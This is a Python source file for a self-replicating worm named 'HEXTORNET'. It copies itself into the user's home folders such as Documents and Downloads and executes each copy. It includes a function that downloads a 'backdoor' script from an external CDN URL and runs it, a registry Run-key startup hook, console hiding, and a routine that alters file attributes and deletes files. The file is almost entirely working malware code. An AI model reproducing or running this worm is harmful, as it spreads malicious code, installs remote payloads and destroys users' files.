#!/usr/bin/env python

#import win32con, win32api, win32console, win32gui
#from _winreg import *
from shutil import copyfile
import os, getpass
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess
import shutil
from time import sleep


print(
"""
[==========================]
+                          +
+     WORM HEXTORNET       +
+                          +
[==========================]
"""
)

code = """

#!/usr/bin/env python
#import win32con, win32api, win32console, win32gui
#from _winreg import *
from shutil import copyfile
import os, getpass
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil


src = os.path.abspath(__file__)
usr = getpass.getuser()
hextornet = ['winHex', 'Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
hexDir = zip(directories, hextornet)
dst = ""

def hide():
	window = win32console.GetConsoleWindow()
	win32gui.ShowWindow(window,0)
	return True

def addStartup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("'\\'")[-1]
    new_file_path = fp + "'\\'" + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, "Process", 0, REG_SZ, new_file_path)

def downloadBackDoor(url):
	print'\t[START DOWNLOAD]',src
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	content = urlopen(url).read()
        outfile = open(filename, "wb")
        outfile.write(content)
        outfile.close()
        #run(os.path.abspath(filename))
	print'\t[DOWNLOAD DONE]', src

def run(program):
	print'\t[RUNNING WORM]',program
	try:
		process = subprocess.Popen('python ' + program, shell=True)
		print'\t[PROCESS WORM]', process
		process.wait()
	except Exception as e:
		return '[!]'+str(e)

def main():
	#hide()
	#addStartup()
	#hide()
	run(src)
	downloadBackDoor("https://cdn.fbsbx.com/v/t59.2708-21/24297685_1903721959657007_3729764176965402624_n.py/registro.py?_nc_cat=103&oh=94924732aeb080d40407392e177da87d&oe=5BAB8629&dl=1")

if __name__ == "__main__":
	main()

"""


src = os.path.abspath('hextornet.py')
usr = getpass.getuser()

hextornet   = ['winHex', 'Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
hexDir = zip(directories, hextornet)

dst = ""

def hide():
	window = win32console.GetConsoleWindow()
	win32gui.ShowWindow(window,0)
	return True


def addStartup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp + "\\" + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)

    SetValueEx(key2change, "Process", 0, REG_SZ, new_file_path)


def windows_client(system = sys.platform):
    if system.startswith('win'):
        return True
    else:
	return False


def linux_client(system = sys.platform):
    if system.startswith('linux'):
        return True
    else:
        return False

def copyHex(hexworm, src, dst):
	copyfile(src, dst)
	print'[PROPAGATE]', dst
	hextornet.remove(hexworm)

def duplicate(hexfile):
	filename = open(str(hexfile),'w')
	filename.write(code)
	filename.close()

def propagate():
	print("==========Worm location==========")
	for d, w in hexDir:
		if linux_client():
			dst = '/' + usr + '/' + d + '/' + str(w) + '.py'
		elif windows_client():
			dst = "C:\Users" + usr + "/" + d + "/" + str(w) + ".py"
		copyHex(w, src, dst)
		duplicate(dst)
		run(dst)
	print("=================================")

def hide():
        for fname in os.listdir('.'):
                if fname.find('.py') == len(fname) - len('.py'):
                        #make the file hidden
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_HIDDEN)
                elif fname.find('.txt') == len(fname) - len('.txt'):
                        #make the file read only
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_READONLY)
                else:
                        #to force deletion of a file set it to normal
                        win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
			os.remove(fname)


def downloadBackDoor(url):
	print'===========1Start downloading=========='
	filename = url.split('/')[-1].split('#')[0].split('?')[0]
	print"...Reading file"
	content = urlopen(url).read()
        outfile = open(filename, "wb")
        outfile.write(content)
	print'...Writing file'
        outfile.close()
        run(os.path.abspath(filename))
	print'==========1finish downloading=========='


def run(program):
	print'[RUN HEXTORNET]',program
	try:
		process = subprocess.Popen('python ' + program, shell=True)
		process.wait()
	except Exception as e:
		return '[!]'+str(e)
	
def main():
	#hide()
	#addStartup()
	propagate()
	#hide()
	#downloadBackDoor("https://cdn.fbsbx.com/v/t59.2708-21/24297685_1903721959657007_3729764176965402624_n.py/registro.py?_nc_cat=103&oh=94924732aeb080d40407392e177da87d&oe=5BAB8629&dl=1")


if __name__ == "__main__":
	main()
